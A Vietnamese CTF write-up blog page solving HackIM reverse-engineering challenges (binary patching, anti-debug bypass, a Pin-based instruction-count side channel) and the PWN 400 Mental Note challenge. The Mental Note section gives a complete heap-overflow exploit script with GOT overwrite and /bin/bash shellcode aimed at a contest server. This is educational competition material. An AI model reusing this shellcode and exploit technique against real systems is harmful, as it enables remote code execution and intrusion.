+<p>search string thì thấy có dòng "You didn't ask nicely" và đặc biệt là "-pl34se-give-me-th3-k3y" :-ss</p>
+<p>tới đây các bạn có thể extract ra 1 file exe mới và disass nghiên cứu (ko chắc là sẽ chạy đc ok), còn mình thì thấy nó có dạng 1 file ms c++ nữa nên so sánh structure với cái PE gốc để tìm addr winMain</p>
+<pre class="lang:default decode:true ">địa chỉ 0x08001100</pre>
+<p>quá trình dịch cũng tương tự, bài mới này cũng không quá khó.</p>
+<pre class="lang:default decode:true ">st = command_line_string
+st[len(st)-1] = \x00
+
+if st[len(st)]==\x20:
+	if !strcmp(st, "-pl34se-give-me-th3-k3y"):
+		func_flag()
+		exit()
+msgbox("You not nicely");</pre>
+<p>patch luôn cho lẹ, patch luôn chỗ strcmp và trong func_flag (0x08001000) có 1 chỗ gọi isDebuggerPresent (0x08001024)</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?ssl=1"><img data-attachment-id="270" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_8/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=421%2C108&amp;ssl=1" data-orig-size="421,108" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_8" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=300%2C77&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=421%2C108&amp;ssl=1" class="alignnone size-full wp-image-270" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?resize=421%2C108&#038;ssl=1" alt="upx_8" width="421" height="108" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?w=421&amp;ssl=1 421w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?resize=300%2C77&amp;ssl=1 300w" sizes="(max-width: 421px) 100vw, 421px" data-recalc-dims="1" /></a></p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?ssl=1"><img data-attachment-id="271" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_9/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=581%2C138&amp;ssl=1" data-orig-size="581,138" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_9" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=300%2C71&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=581%2C138&amp;ssl=1" class="alignnone size-full wp-image-271" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?resize=581%2C138&#038;ssl=1" alt="upx_9" width="581" height="138" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?w=581&amp;ssl=1 581w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?resize=300%2C71&amp;ssl=1 300w" sizes="(max-width: 581px) 100vw, 581px" data-recalc-dims="1" /></a></p>
+<p>Done.</p>
+<p>----------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 400 - fin64</span></h2>
+<pre class="lang:default decode:true ">ubt64@ubt64-vb:/media/sf_Desktop/nullcon/re/fin64$ file fin64
+fin64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x9b62a9678a30ce6c576131024148154a0bc5575d, stripped</pre>
+<p>khi chạy và thử nhiều cách input, đều có kết quả "Not yet.."</p>
+<pre class="lang:default decode:true ">ubt64@ubt64-vb:/media/sf_Desktop/nullcon/re/fin64$ ./fin64
+Not yet..</pre>
+<p>main khá ngắn, ta dịch lần lượt<br />
+để ý, có 2 cái good_boy và bad_boy trong hình</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?ssl=1"><img data-attachment-id="274" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_1/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=657%2C306&amp;ssl=1" data-orig-size="657,306" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_1" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=300%2C140&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=604%2C281&amp;ssl=1" class="alignnone size-full wp-image-274" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?resize=604%2C281&#038;ssl=1" alt="fin64_1" width="604" height="281" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?w=657&amp;ssl=1 657w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?resize=300%2C140&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>đầu tiên là func_systime<br />
+gọi syscall 0xc9 để lấy timestamp sao đó lưu giá trị vào [rbp-18h]</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?ssl=1"><img data-attachment-id="275" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=515%2C294&amp;ssl=1" data-orig-size="515,294" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=300%2C171&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=515%2C294&amp;ssl=1" class="alignnone size-full wp-image-275" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?resize=515%2C294&#038;ssl=1" alt="fin64_2" width="515" height="294" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?w=515&amp;ssl=1 515w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?resize=300%2C171&amp;ssl=1 300w" sizes="(max-width: 515px) 100vw, 515px" data-recalc-dims="1" /></a></p>
+<p>func_ctime - convert timestamp thành giá trị giây:phút:giờ:ngày:tháng:năm =&gt; lưu vào [rbp-10h]</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?ssl=1"><img data-attachment-id="276" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=477%2C131&amp;ssl=1" data-orig-size="477,131" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=300%2C82&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=477%2C131&amp;ssl=1" class="alignnone size-full wp-image-276" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?resize=477%2C131&#038;ssl=1" alt="fin64_3" width="477" height="131" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?w=477&amp;ssl=1 477w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?resize=300%2C82&amp;ssl=1 300w" sizes="(max-width: 477px) 100vw, 477px" data-recalc-dims="1" /></a></p>
+<p>dừng ở đây, jump ngược từ good_boy và bad_boy ta thấy có đoạn sử dụng [rbp-10h]</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?ssl=1"><img data-attachment-id="277" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_4/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=442%2C380&amp;ssl=1" data-orig-size="442,380" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_4" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=300%2C258&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=442%2C380&amp;ssl=1" class="alignnone size-full wp-image-277" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?resize=442%2C380&#038;ssl=1" alt="fin64_4" width="442" height="380" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?w=442&amp;ssl=1 442w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?resize=300%2C258&amp;ssl=1 300w" sizes="(max-width: 442px) 100vw, 442px" data-recalc-dims="1" /></a></p>
+<p>nếu [rbp-10h] ở không bị thay đổi thì đoạn code pseudo ntn:</p>
+<pre class="lang:default decode:true ">[rbp-24h] = [dw_time+16]+1 = tháng
+[rbp-20h] = [dw_time+12] = ngày
+[rbp-1ch] = [dw_time+20] + 1900 = năm
+if ( [rbp-24h] == 9 &amp;&amp; [rbp-20h] == 10 &amp;&amp; [rbp-1ch] == 2011 )
+	good_boy
+else
+	bad_boy</pre>
+<p>thử đặt lại time là 10/9/2011 và run =&gt; still failed :wth:</p>
+<p>giờ ta jump back từ đoạn compare trên đến ngay sau chỗ convert, patch những đoạn jump để bypass khoảng ở giữa và chạy lại 1 lần nữa</p>
+<pre class="lang:default decode:true ">$ ./fin64
+Oops..</pre>
+<p>Good bj, mình đoán flag nằm trong memory, thử trace dần vào good_boy</p>
+<p>thì phát hiện ra cái này *byte_6c2070</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?ssl=1"><img data-attachment-id="278" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_5-2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=789%2C214&amp;ssl=1" data-orig-size="789,214" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_5" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=300%2C81&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=604%2C164&amp;ssl=1" class="alignnone size-full wp-image-278" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?resize=604%2C164&#038;ssl=1" alt="fin64_5" width="604" height="164" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?w=789&amp;ssl=1 789w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?resize=300%2C81&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>next-challenge</p>
+<p>--------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 500 - cso</span></h2>
+<p>bài này thực sự không biết nên viết writeup như thế nào vì công nhận là nó khá bựa và cách làm cũng ngẫu hứng vãi nhái :3</p>
+<p>sau hồi dịch mình chả biết nó là cái giống gì, có vẻ giống virtual machine nhưng cũng ko giống lắm =)), đại khái nó như này:</p>
+<pre class="lang:python decode:true ">main:
+	print(Bla bla bla)
+	gets(st) #main input
+	len_st = strlen(st)
+	super = 0x24ae5af1 #first magic hex
+	while True:
+		A: 
+			if super-a1&gt;0: jump b1
+		B: 
+			if super-a2&gt;0: jump b2
+		C: 
+			if super-a3&gt;0: jump b3
+		...
+		V: 
+			if super-an&gt;0: jump bn
+		X:
+			super = a(n+1)
+		Y:
+			super = a(n+2)
+		...
+		Z:
+			super = am
+		quit:
+			break
+		dead: 
+			puts("You are dead man")
+			super = super_to_quit
+			continue
+		win: 
+			puts("You are safe and live forever")
+			super = super_to_quit
+			continue
+		check_len: 
+			if len_st==0x1A: 
+				super = super_to_stage2
+			else:
+				super = super_to_dead
+			continue
+		stage_2:
+			#func_stage2 ở địa chỉ 0x00400ec0
+			if func_stage2(st)==1: 
+				super = super_to_win
+			else:
+				super=super_to_dead
+			continue
+
+#mấy số a1, a2, ...an, a(n+1), ... , am là magic const, ko biết có quy luật gì những mà nó đc build để tính toán hợp lí
+#các jump b1, b2, b3, ... bn là nhãn của một trong mấy thằng A,B,C,...V, quit, dead, win, check_len, stage_2
+
+			
+def stage2(st):
+	#cấu trúc đệ quy
+	#vòng lặp tương tự main
+	#có thêm 1 số sub function phụ</pre>
+<p>Không biết flag ở chỗ nào luôn, code follow control dựa vào mấy phép cộng của a(i), giờ tìm quy luật cho nó cũng đuối đơ. Có duy nhất 1 cái chắc chắn là len_st = 0x1A = 26 (!!!)</p>
+<p>Sau nửa tiếng suy nghĩ, mình thấy khi input với len = 26 và len &lt; 26 thì cảm giác debug lâu hơn. Suy nghĩ: Side channel dựa vào instruction count được không?</p>
+<pre class="lang:sh decode:true ">$ python -c "print 'a'*26" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123368
+
+$ python -c "print 'a'*25" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123097
+
+$ python -c "print 'a'*24" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123097</pre>
+<p>Bingo, chuẩn girl mất rồi, side channel bem lần lượt các char</p>
+<pre class="lang:python decode:true">import subprocess
+import time
+
+sam = "abcdefghijklmnopqrstuvwxyz"
+sam += sam.upper()
+sam += "0123456789_!,.{}"
+
+#217826 SRRDRSSRSRRDDSSSRSSDSDDDSS
+
+def insco(fl):
+	fl += 'a'*(26-len(fl))
+	open('hellyeah','wt').write(fl)
+	subprocess.call("./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ../cso &lt; hellyeah", shell=True)
+	time.sleep(0.2)
+	k = open("inscount.out").read().strip().split(' ')[1]
+	print "-----", fl, k
+	return int(k)
+
+def dequy(fl):
+	if len(fl)==26:
+		print fl
+		raw_input("&lt;&lt; Another result, enter for the next...")
+	else:
+		a = insco(fl + 'a')
+		#Cho nay sample chi co 1 ki tu trong string "SRD" thoi (manual check), co the set sam = "SRD" side channel nhanh hon
+		for c in sam:
+			cou = insco(fl + c)
+			if cou-a&gt;400: dequy(fl + c)
+
+
+dequy('')</pre>
+<p>=&gt; Final <span style="color: #ff0000;">SRRDRSSRSRRDDSSSRSSDSDDDSS</span>. Không giống flag cho lắm :-ss</p>
+<p>Input test lại vẫn "You are dead man". Wut dafuq, đúng quá rồi còn gì.<br />
+Check lại cái inscount thì thấy có sự chênh lệch rất lớn ins.<br />
+Có thể là những mini-sub trong stage2 (0x00400ec0)<br />
+Kiểm tra lần lượt từng mini-sub đó ta thấy có sub_400BD0 sử dụng biến global(s) chính là string input ban đầu?!?</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?ssl=1"><img data-attachment-id="280" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_1/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=532%2C82&amp;ssl=1" data-orig-size="532,82" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_1" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=300%2C46&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=532%2C82&amp;ssl=1" class="alignnone size-full wp-image-280" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?resize=532%2C82&#038;ssl=1" alt="cso_1" width="532" height="82" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?w=532&amp;ssl=1 532w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?resize=300%2C46&amp;ssl=1 300w" sizes="(max-width: 532px) 100vw, 532px" data-recalc-dims="1" /></a></p>
+<p>Đặt breakpoint ngay tại đó và input đúng như trên, sau 1 số lần trace thì ...</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?ssl=1"><img data-attachment-id="281" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=503%2C131&amp;ssl=1" data-orig-size="503,131" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=300%2C78&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=503%2C131&amp;ssl=1" class="alignnone size-full wp-image-281" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?resize=503%2C131&#038;ssl=1" alt="cso_2" width="503" height="131" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?w=503&amp;ssl=1 503w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?resize=300%2C78&amp;ssl=1 300w" sizes="(max-width: 503px) 100vw, 503px" data-recalc-dims="1" /></a><br />
+Âu Mai Gót, call cái địa chỉ vừa trả về, không phải run shell thì là run cái gì nữa =))</p>
+<p>Chuyển hướng sang disass con shell, tương tự 3 bài rồi</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?ssl=1"><img data-attachment-id="279" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=503%2C230&amp;ssl=1" data-orig-size="503,230" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=300%2C137&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=503%2C230&amp;ssl=1" class="alignnone size-full wp-image-279" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?resize=503%2C230&#038;ssl=1" alt="cso_3" width="503" height="230" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?w=503&amp;ssl=1 503w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?resize=300%2C137&amp;ssl=1 300w" sizes="(max-width: 503px) 100vw, 503px" data-recalc-dims="1" /></a></p>
+<p>move rất nhiều ASCII Char vào memory, ghép lại thì thấy đó là 1 chuỗi base32 😛</p>
+<p>Hard time gone 😛</p>
+<pre class="lang:python decode:true">s = "MZWGCZ33NV4V6YZQNVYDINJVL4YTKX3VNYYXC5JTPU"
+sam = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+
+def tobin(t):
+    st = bin(t).replace('0b','')
+    st = '0'*(5-len(st)) + st
+    return st
+
+k = ''
+for i in s:
+    t = sam.find(i)
+    print i, sam.find(i), tobin(t)
+    k += tobin(t)
+
+k = k[0:208]
+print hex(int(k,2))[2:].replace('L','').decode('hex')</pre>
+<p><span style="color: #ff0000;"><strong>flag{my_c0mp455_15_un1qu3}</strong></span></p>
+<p>--------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">PWN 400 - Mental Note</span></h2>
+<p>bài này về cơ bản khá giống <a title="PWN500 - mixme" href="write-up-hackim-ctf-mixme-pwn5/index.html" target="_blank">mixme</a></p>
+<p>cấu trúc dữ liệu:</p>
+<pre class="lang:c decode:true">struct note{
+	int size;
+	note* next_note;
+	note* prev_note;
+	content[linh động]
+}</pre>
+<p>và array_note[999] lưu địa chỉ con trỏ của mỗi note được thêm</p>
+<p>có 3 loại note:</p>
+<pre class="lang:default decode:true ">loại 0 : content 100 bytes
+loại 1 : content 200 bytes
+loại 2 : content 400 bytes</pre>
+<p>* add-note, người dùng nhập 1 loại note sau đó chương trình malloc 1 lượng bộ nhớ vừa đủ phần header+content size =&gt; new_note</p>
+<p>new_note được insert vào array_note sau khi đã check-note (dựa vào note header) để tìm id phù hợp.</p>
+<p>* edit-note, người dùng nhập id, loại note và read(note-id-content, size=note-type) mà ko check xem note ở id ấy có đúng loại không.<br />
+=&gt; nếu note add vào là loại 0 mà khi edit với loại 1/2 thì sẽ overwrite được sang header note khác.</p>
+<p>bằng cách này ta sẽ chỉnh phần header của note kế tiếp để khai thác lỗi check-note của add-note function.</p>
+<p>Payload:</p>
+<pre class="lang:python decode:true ">import socket, time
+
+def send(s, m):
+    print "[SEND]", m
+    s.send(m)
+
+def recv(s):
+    t = s.recv(4096)
+    print "[RECV]", t
+    return t
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect (( "54.163.248.69",9004 ))
+
+recv(s)
+recv(s)
+
+#Add 3 notes, Type 0
+for i in range(3):
+	send(s, "1\n")
+	recv(s)
+	send(s, "0\n")
+	recv(s)
+
+#Edit note id=2, Type=0, shellcode
+send(s, "3\n")
+recv(s)
+send(s, "2\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+#shell
+shell = "\x6a\x0f\x58\x83\xe8\x04\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+send(s, "\x90"*20 + shell)
+recv(s)
+
+#Edit note id=0, Type=1, overwrite header and change g0t.plt
+send(s, "3\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+send(s, "1\n")
+recv(s)
+#magic bytes
+send(s, (0x80-12)*'a' + "\x04\xc1\xeb\x0f\x1c\xb0\x04\x08")
+recv(s)
+
+#jump to shellcode by function was changed in g0t.plt
+send(s, "1\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+
+send(s,"cat flag.txt\n")
+recv(s)
+
+#flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
+
+s.close()</pre>
+<p><span style="color: #ff0000;"><strong>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</strong></span> !!!</p>
+<p><em>So long and deep, go get some sleep :'( . Chim!</em></p>
+	</div><!-- .entry-content -->
+	
+	<footer class="entry-meta">
+		
+			</footer><!-- .entry-meta -->
+</article><!-- #post -->
+							
+<article id="post-237" class="post-237 post type-post status-publish format-standard hentry category-pwn">
+	<header class="entry-header">
+		
+				<h1 class="entry-title">
+			<a href="write-up-hackim-ctf-mixme-pwn5/index.html" rel="bookmark">[Write Up] Hackim CTF - mixme - PWN5</a>
+		</h1>
+		
+		<div class="entry-meta">
+			<span class="date"><a href="write-up-hackim-ctf-mixme-pwn5/index.html" title="Permalink to [Write Up] Hackim CTF - mixme - PWN5" rel="bookmark"><time class="entry-date" datetime="2015-01-12T05:35:09+00:00">January 12, 2015</time></a></span><span class="categories-links"><a href="../../category/pwn/index.html" rel="category tag">pwn</a></span><span class="author vcard"><a class="url fn n" href="../../author/peternguyen/index.html" title="View all posts by peternguyen" rel="author">peternguyen</a></span>					</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+		<div class="entry-content">
+		<p>Đánh giá sơ lược về binary:</p>
+<pre class="lang:zsh decode:true">~/Sources/CTFs/hackim » file mixme                               peternguyen@peternguyen
+mixme: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b93d20dd523097dd7d53a7fda265a2d977d29c30, stripped</pre>
+<p>Checksec:</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111306AM_zps163b811d.png?resize=284%2C208" alt="" width="284" height="208" data-recalc-dims="1" /></p>
+<p>Chương trình có 3 lệnh chính: (<strong>store</strong>/<strong>edit</strong>/<strong>get</strong>)</p>
+<h5><strong>Phân tích hàm edit</strong></h5>
+<p>Đựa trên hàm store, mình có thể reverse lại được cấu trúc lưu trữ của chương trình như sau:</p>
+<pre class="lang:c decode:true">struct node{
+ char name[16];
+ int size;
+ char *data;
+ struct node *next;
+ struct node *prev;
+}</pre>
+<p>size là khích cỡ vùng nhớ được malloc cho data.</p>
+<p>Các node được lưu trữ bằng một danh sách double linked list circular</p>
